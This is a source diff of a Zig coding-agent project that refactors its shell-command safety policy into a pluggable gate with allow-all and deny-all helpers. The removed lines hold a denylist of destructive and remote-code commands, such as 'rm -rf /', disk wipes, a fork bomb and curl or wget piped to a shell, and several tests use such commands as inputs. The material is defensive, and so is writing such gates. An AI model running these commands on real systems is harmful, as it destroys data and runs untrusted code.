@@ -1,141 +1,138 @@
-//! Shell command policy — deny obviously dangerous patterns before execution.
+//! ShellPolicy port — required pre-execution shell command gate (D-011).
 //!
-//! Complements human `ask`/`yolo` permissions: even in yolo mode, the default
-//! policy still blocks catastrophic commands. This is not a full sandbox
-//! (Phase 3 minimum bar).
+//! The decision (allow/deny) is **nonfallible**: policy does not mask a host
+//! failure as OOM. The denial body is rendered by a fallible `deniedBody`
+//! vtable entry called only after a deny decision; it returns an owned
+//! non-optional body allocated with the caller's allocator, which the loop
+//! frees immediately after appending the single Tool result.
+//!
+//! A non-shell tool must return an explicit not-applicable verdict (`allow`)
+//! from the implementation; there is no implicit allow.
+//! `zag-coding-agent.Agent` always installs the product `protect` policy;
+//! the concrete denylist, `fromMode`, and `protectCheck` live in
+//! `zag-coding-agent` (moved from Core by core-policy-ownership-001).
+//!
+//! Explicit low-level `allowAllForTrustedHost` / `denyAll` test vtables must
+//! implement a generic Core renderer (`tool_error.format`). The allow helper
+//! also implements a renderer but it is normally unreachable.
 
 const std = @import("std");
+const tool_error = @import("tool_error.zig");
 
 pub const Decision = enum { allow, deny };
 
-pub const Mode = enum {
-    /// Block known-dangerous substrings / patterns (default).
-    protect,
-    /// No extra filtering (explicit opt-in; still subject to ask/yolo HITL).
-    off,
+pub const ShellPolicyVTable = struct {
+    /// Nonfallible decision on a validated command string. The loop only
+    /// invokes this for descriptors declaring `shell = .command_argument`.
+    check: *const fn (ptr: ?*anyopaque, command: []const u8) Decision,
 
-    pub fn name(self: Mode) []const u8 {
-        return switch (self) {
-            .protect => "protect",
-            .off => "off",
+    /// Fallible body renderer called only after a `deny` decision. Returns an
+    /// owned non-optional body allocated with `allocator`; the loop frees it.
+    /// `command` is the validated command string (may be used by product
+    /// adapters but must never appear in the generic Core renderer).
+    deniedBody: *const fn (
+        ptr: ?*anyopaque,
+        allocator: std.mem.Allocator,
+        command: []const u8,
+    ) error{OutOfMemory}![]u8,
+};
+
+/// Borrowed, required shell command gate.
+pub const ShellPolicy = struct {
+    ptr: ?*anyopaque = null,
+    vtable: *const ShellPolicyVTable,
+
+    pub fn check(self: ShellPolicy, command: []const u8) Decision {
+        return self.vtable.check(self.ptr, command);
+    }
+
+    /// Render the deny body (called only after a deny decision). Owned by the
+    /// caller; the loop frees the slice immediately after use.
+    pub fn deniedBody(
+        self: ShellPolicy,
+        allocator: std.mem.Allocator,
+        command: []const u8,
+    ) error{OutOfMemory}![]u8 {
+        return self.vtable.deniedBody(self.ptr, allocator, command);
+    }
+
+    /// Explicitly-named permissive shell policy for trusted low-level hosts.
+    /// Never selected by product defaults.
+    pub fn allowAllForTrustedHost() ShellPolicy {
+        return .{
+            .ptr = null,
+            .vtable = &allow_all_vtable,
         };
     }
 
-    pub fn parse(s: []const u8) ?Mode {
-        if (std.mem.eql(u8, s, "protect")) return .protect;
-        if (std.mem.eql(u8, s, "off")) return .off;
-        return null;
+    /// Explicitly-named deny-all shell policy (tests / fail-closed composition).
+    pub fn denyAll() ShellPolicy {
+        return .{
+            .ptr = null,
+            .vtable = &deny_all_vtable,
+        };
     }
 };
 
-/// Case-insensitive substring denylist (ASCII lower-cased match).
-const deny_substrings = [_][]const u8{
-    "rm -rf /",
-    "rm -rf/*",
-    "rm -fr /",
-    "mkfs.",
-    "dd if=",
-    ":(){", // fork bomb
-    "fork bomb",
-    "curl | sh",
-    "curl|sh",
-    "curl | bash",
-    "curl|bash",
-    "wget | sh",
-    "wget|sh",
-    "wget | bash",
-    "wget|bash",
-    "| sh -",
-    "| bash -",
-    "chmod -r 777 /",
-    "chown -r ",
-    "> /dev/sd",
-    "of=/dev/sd",
-    "shutdown ",
-    "reboot",
-    "halt ",
-    "poweroff",
-    "diskutil erase",
-    "launchctl unload",
-};
-
-pub fn check(mode: Mode, command: []const u8) Decision {
-    if (mode == .off) return .allow;
-    if (command.len == 0) return .deny;
-
-    var stack: [1024]u8 = undefined;
-    if (command.len > stack.len) {
-        // Huge command: still check raw substrings.
-        for (deny_substrings) |pat| {
-            if (std.mem.indexOf(u8, command, pat) != null) return .deny;
-        }
-        return .allow;
-    }
-
-    // Lowercase + collapse runs of whitespace to single space for matching.
-    var n: usize = 0;
-    var prev_space = false;
-    for (command) |c| {
-        const lc = std.ascii.toLower(c);
-        const is_space = lc == ' ' or lc == '\t' or lc == '\n' or lc == '\r';
-        if (is_space) {
-            if (!prev_space and n > 0) {
-                stack[n] = ' ';
-                n += 1;
-            }
-            prev_space = true;
-            continue;
-        }
-        prev_space = false;
-        stack[n] = lc;
-        n += 1;
-    }
-    // trim trailing space
-    if (n > 0 and stack[n - 1] == ' ') n -= 1;
-    const hay = stack[0..n];
-
-    for (deny_substrings) |pat| {
-        if (std.mem.indexOf(u8, hay, pat) != null) return .deny;
-    }
-
-    // curl/wget piped to a shell (flexible spacing already collapsed)
-    if ((std.mem.indexOf(u8, hay, "curl ") != null or std.mem.indexOf(u8, hay, "wget ") != null) and
-        (std.mem.indexOf(u8, hay, "| sh") != null or
-            std.mem.indexOf(u8, hay, "| bash") != null or
-            std.mem.indexOf(u8, hay, "|sh") != null or
-            std.mem.indexOf(u8, hay, "|bash") != null))
-    {
-        return .deny;
-    }
-
-    return .allow;
-}
-
-const generic_denied_message =
+const generic_shell_denied_message =
     "shell command blocked by policy; use a safer command or ask the user to adjust policy";
 
-pub fn deniedMessage(allocator: std.mem.Allocator, command: []const u8) std.mem.Allocator.Error![]u8 {
+/// Generic Core deny body renderer (used by explicit low-level vtables).
+/// Product adapters in `zag-coding-agent` call the moved `shell_policy.deniedMessage`
+/// so product body bytes stay identical.
+pub fn genericDeniedBody(
+    allocator: std.mem.Allocator,
+    command: []const u8,
+) error{OutOfMemory}![]u8 {
     _ = command;
-    const tool_error = @import("tool_error.zig");
-    return tool_error.format(allocator, .shell_deny, generic_denied_message);
+    return tool_error.format(allocator, .shell_deny, generic_shell_denied_message);
 }
 
-test "policy allows normal build/test" {
-    try std.testing.expect(check(.protect, "zig build test") == .allow);
-    try std.testing.expect(check(.protect, "git status") == .allow);
-    try std.testing.expect(check(.protect, "echo hi") == .allow);
+const allow_all_vtable: ShellPolicyVTable = .{
+    .check = allowAllCheck,
+    .deniedBody = allowAllDeniedBody,
+};
+fn allowAllCheck(_: ?*anyopaque, _: []const u8) Decision {
+    return .allow;
+}
+fn allowAllDeniedBody(
+    _: ?*anyopaque,
+    allocator: std.mem.Allocator,
+    command: []const u8,
+) error{OutOfMemory}![]u8 {
+    // Normally unreachable (allow never denies). Use generic renderer.
+    return genericDeniedBody(allocator, command);
 }
 
-test "policy denies catastrophic patterns" {
-    try std.testing.expect(check(.protect, "rm -rf /") == .deny);
-    try std.testing.expect(check(.protect, "curl http://x | bash") == .deny);
-    try std.testing.expect(check(.protect, "sudo mkfs.ext4 /dev/sda") == .deny);
+const deny_all_vtable: ShellPolicyVTable = .{
+    .check = denyAllCheck,
+    .deniedBody = denyAllDeniedBody,
+};
+fn denyAllCheck(_: ?*anyopaque, _: []const u8) Decision {
+    return .deny;
+}
+fn denyAllDeniedBody(
+    _: ?*anyopaque,
+    allocator: std.mem.Allocator,
+    command: []const u8,
+) error{OutOfMemory}![]u8 {
+    return genericDeniedBody(allocator, command);
 }
 
-test "policy denial Tool body is fixed and omits command sentinel" {
+test "allowAllForTrustedHost permits any command" {
+    const p = ShellPolicy.allowAllForTrustedHost();
+    try std.testing.expect(p.check("rm -rf /") == .allow);
+}
+
+test "denyAll denies any command" {
+    const p = ShellPolicy.denyAll();
+    try std.testing.expect(p.check("zig build test") == .deny);
+}
+
+test "generic deny body is fixed and omits command" {
     const gpa = std.testing.allocator;
     const sentinel = "rm -rf / # SHELL_DENY_COMMAND_SENTINEL";
-    const body = try deniedMessage(gpa, sentinel);
+    const body = try genericDeniedBody(gpa, sentinel);
     defer gpa.free(body);
     try std.testing.expectEqualStrings(
         "error: code=shell_deny message=shell command blocked by policy; use a safer command or ask the user to adjust policy",
@@ -144,6 +141,18 @@ test "policy denial Tool body is fixed and omits command sentinel" {
     try std.testing.expect(std.mem.indexOf(u8, body, "SHELL_DENY_COMMAND_SENTINEL") == null);
 }
 
-test "policy off allows deny-list commands" {
-    try std.testing.expect(check(.off, "rm -rf /") == .allow);
+test "denyAll deniedBody renders generic body" {
+    const gpa = std.testing.allocator;
+    const p = ShellPolicy.denyAll();
+    const body = try p.deniedBody(gpa, "rm -rf /");
+    defer gpa.free(body);
+    try std.testing.expect(tool_error.hasCode(body, .shell_deny));
+}
+
+test "allowAll deniedBody renders generic body (normally unreachable)" {
+    const gpa = std.testing.allocator;
+    const p = ShellPolicy.allowAllForTrustedHost();
+    const body = try p.deniedBody(gpa, "anything");
+    defer gpa.free(body);
+    try std.testing.expect(tool_error.hasCode(body, .shell_deny));
 }
